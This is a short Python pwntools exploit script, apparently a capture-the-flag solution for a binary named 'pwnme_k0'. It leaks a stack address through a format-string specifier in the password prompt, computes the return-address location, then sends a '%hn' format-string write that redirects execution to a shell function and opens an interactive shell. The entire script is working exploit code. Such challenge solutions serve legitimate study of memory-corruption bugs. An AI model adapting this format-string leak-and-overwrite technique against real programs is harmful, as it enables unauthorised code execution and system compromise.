#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

offset_rbp_ret = 0x7fffffffdf50 - 0x7fffffffdf18
sh_addr = 0x4008A6

io = process("./pwnme_k0")

io.sendlineafter("username(max lenth:20): \n", "M4x")
io.sendlineafter("password(max lenth:20): \n", "%6$paaaa")
io.sendlineafter(">", "1")

rbp_addr = int(io.recvuntil("aaaa")[-18: -4], 16)
info("rbp_addr -> 0x%x" % rbp_addr)
ret_addr = rbp_addr - offset_rbp_ret
info("ret_addr -> 0x%x" % ret_addr)

io.sendlineafter(">", "2")
io.sendlineafter("username(max lenth:20): \n", p64(ret_addr))
io.recvuntil("password(max lenth:20): \n")
payload = "%" + str(sh_addr & 0xffff) + "d" + "%8$hn"
#  print payload
io.sendline(payload)
io.sendlineafter(">", "1")

io.interactive()
io.close()

